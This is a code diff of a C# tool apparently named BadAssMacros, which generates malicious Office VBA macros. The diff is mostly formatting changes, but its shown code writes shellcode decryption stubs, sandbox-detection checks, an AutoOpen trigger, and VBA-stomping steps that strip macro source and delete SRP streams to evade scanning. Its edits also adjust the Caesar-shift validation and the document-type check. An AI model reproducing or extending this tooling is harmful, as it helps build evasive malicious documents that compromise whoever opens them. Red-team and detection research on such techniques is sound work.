@@ -1,9 +1,9 @@
-﻿using System;
+﻿using NDesk.Options;
+using OpenMcdf;
+using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Text;
-using OpenMcdf;
-using NDesk.Options;
 
 
 namespace BadAssMacros
@@ -16,7 +16,7 @@ namespace BadAssMacros
         static Random rd = new Random();
         static string shellcodeexec = "classic";
         static int caesar = 0;
-        
+
         public static void Import_Statements(string shellcode)
 
         {
@@ -142,7 +142,8 @@ namespace BadAssMacros
             p.WriteOptionDescriptions(Console.Out);
         }
 
-        public static void Ascii() {
+        public static void Ascii()
+        {
 
             Console.WriteLine("  ____            _                  __  __                          ");
             Console.WriteLine(" |  _ \\          | |   /\\           |  \\/  |                         ");
@@ -151,7 +152,7 @@ namespace BadAssMacros
             Console.WriteLine(" | |_) | (_| | (_| |/ ____ \\__ \\__ \\| |  | | (_| | (__| | | (_) \\__ \\");
             Console.WriteLine(" |____/ \\__,_|\\__,_/_/    \\_\\___/___/_|  |_|\\__,_|\\___|_|  \\___/|___/");
             Console.WriteLine("\t\t\t            \n\n Author: @Inf0secRabbit && @SoumyadeepBas12\n");
-            
+
         }
 
         static void Main(string[] args)
@@ -176,7 +177,7 @@ namespace BadAssMacros
                 {"c|shift=","Enter caesar shift between 1-25\n",v =>caesar=Convert.ToInt32(v)},
                 {"h|?|help","Show Help\n", v => show_help = v != null},
             };
-            
+
 
 
 
@@ -206,7 +207,7 @@ namespace BadAssMacros
                         return;
                     }
 
-                    if (caesar > 25 || caesar < 1)
+                    if ((caesar > 25 || caesar < 1) && shellcodeexec == "classic")
                     {
                         Console.WriteLine("Uhh-Ohh!! Caesar length should be less than 25 and more than 1");
                         ShowHelp(options);
@@ -320,10 +321,10 @@ namespace BadAssMacros
                             if (vbaModule.moduleName == _modname)
                             {
                                 Console.WriteLine("\n[+] Target module name: " + vbaModule.moduleName);
-                               
+
                                 streamBytes = commonStorage.GetStorage("VBA").GetStream(vbaModule.moduleName).GetData();
                                 string OG_VBACode = Utils.GetVBATextFromModuleStream(streamBytes, vbaModule.textOffset);
-                                                             
+
                                 streamBytes = Utils.RemovePcodeInModuleStream(streamBytes, vbaModule.textOffset, OG_VBACode);
                                 commonStorage.GetStorage("VBA").GetStream(vbaModule.moduleName).SetData(streamBytes);
                                 module_found = true;
@@ -342,24 +343,24 @@ namespace BadAssMacros
                         }
 
                         commonStorage.GetStorage("VBA").GetStream("dir").SetData(Utils.Compress(Utils.ChangeOffset(dirStream)));
-                       
+
                         byte[] data = Utils.HexToByte("CC-61-FF-FF-00-00-00");
                         commonStorage.GetStorage("VBA").GetStream("_VBA_PROJECT").SetData(data);
-                        
+
                         try
                         {
                             commonStorage.GetStorage("VBA").Delete("__SRP_0");
                             commonStorage.GetStorage("VBA").Delete("__SRP_1");
                             commonStorage.GetStorage("VBA").Delete("__SRP_2");
                             commonStorage.GetStorage("VBA").Delete("__SRP_3");
-                            
+
                         }
                         catch (Exception)
                         {
                             Console.WriteLine("\n[*] No SRP streams found.");
                         }
 
-                       
+
                         cf.Commit();
                         cf.Close();
                         CompoundFile.ShrinkCompoundFile(_filename);
@@ -400,7 +401,8 @@ namespace BadAssMacros
         public static void Sandboxingdetection(string shellcodeexec)
         {
 
-            if (shellcodeexec == "classic") {
+            if (shellcodeexec == "classic")
+            {
                 //Recent Files Count
                 WriteFile(" If Application.RecentFiles.Count < 3 Then\n");
                 WriteFile("Exit Function\n");
@@ -416,7 +418,7 @@ namespace BadAssMacros
                 WriteFile("Next\n");
 
             }
-           
+
         }
 
         public static void Decrypt(string shellcode)
@@ -447,7 +449,7 @@ namespace BadAssMacros
 
         public static void Auto_open(string type)
         {
-            if (type == "word")
+            if (type == "doc")
             {
 
                 WriteFile("Sub AutoOpen()\n");
@@ -461,7 +463,7 @@ namespace BadAssMacros
                 WriteFile(s[0] + "\n");
                 WriteFile("End Sub\n");
             }
-           
+
         }
 
         public static void Encrypt(byte[] bytes, string shellcode)
